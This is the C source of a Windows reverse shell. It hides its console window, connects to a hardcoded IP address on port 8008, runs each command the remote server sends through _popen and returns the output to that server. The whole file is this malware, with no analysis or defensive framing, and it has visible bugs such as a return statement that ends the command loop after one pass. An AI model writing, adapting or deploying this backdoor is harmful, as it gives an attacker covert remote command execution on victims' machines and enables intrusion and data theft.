#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <winbase.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <iphlpapi.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <direct.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

//int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdline, int nCmdShow)
int __cdecl main(int argc, char **argv)
{
    SOCKET sock;
    HWND winHandle;
    WSADATA wsaData;
	
    winHandle = GetConsoleWindow();
    ShowWindow(winHandle, SW_HIDE);
    
    char sv_ip[] = "138.75.233.231";
    int sv_port = 8008;

    //init Socket
    int startupResult;
    startupResult = WSAStartup(MAKEWORD(2,2), &wsaData);//returns 0 if there are no errors with initialising usage of ws2_32.dll//MAKEWORD(2,2) may not work
    //since the ws2_32.dll is ver 2.0
    
    if(startupResult != 0)
    {
		printf("WSAStartup init failed: %d\n", startupResult);
		return 1;
    }
	
    //create a socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sock == INVALID_SOCKET)
    {
		printf("Socket creation failed at socket(): %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
    }
    
    //connect to the server
    struct sockaddr_in sv_info;
    sv_info.sin_family = AF_INET;
    sv_info.sin_addr.s_addr = inet_addr(sv_ip);
	sv_info.sin_port = htons(sv_port);

	connect_again:
    int connectionResult;

    while(connectionResult = connect(sock, (SOCKADDR *) &sv_info, sizeof(sv_info)) != 0)
    {
		if(connectionResult == SOCKET_ERROR)
		{
			printf("Connection failed with error at connect(): %ld\n", WSAGetLastError());	
		}
		Sleep(1);
		printf("Attempting connection again\n");
    }

    //connection phase ended. the section below executes commands sent by server
    char recv_buffer[1025];//one extra byte has NOT been allocated for null pointer
    char container[1025];
    char res_buffer[32769];//32768 is 32 KB but another one for null terminator

	while(1)
    {	
		memset(recv_buffer, 0, sizeof(recv_buffer));
		memset(container, 0, sizeof(container));
		memset(res_buffer, 0, sizeof(res_buffer));

		recv_buffer[sizeof(recv_buffer) - 1] = '\0';
		container[sizeof(container) - 1] = '\0';
		res_buffer[sizeof(res_buffer) - 1] = '\0';
		
			recv(sock, recv_buffer, sizeof(recv_buffer), 0);
		recv_buffer[sizeof(recv_buffer) - 1] = '\0';//apparently null terminator bytes arent transferred over so gotta manually assign one.
		
		if(strncmp("q", recv_buffer, 1) == 0)
		{
			closesocket(sock);
			WSACleanup();
			goto connect_again;
			//exit(0);
		}
		else if(strncmp("C:\\", recv_buffer, 4) == 0)
		{
			chdir(("%s", recv_buffer));
		}
		else
		{
			FILE *fp;
			fp = _popen(recv_buffer, "r");

			while(fgets(container, sizeof(container), fp) != NULL)
			{
				strncat(res_buffer, container, sizeof(container));
			}

			res_buffer[sizeof(res_buffer) - 1] = '\0';
			send(sock, res_buffer, sizeof(res_buffer), 0);    

			fclose(fp);
		}
		
		return 0;    
	}
}
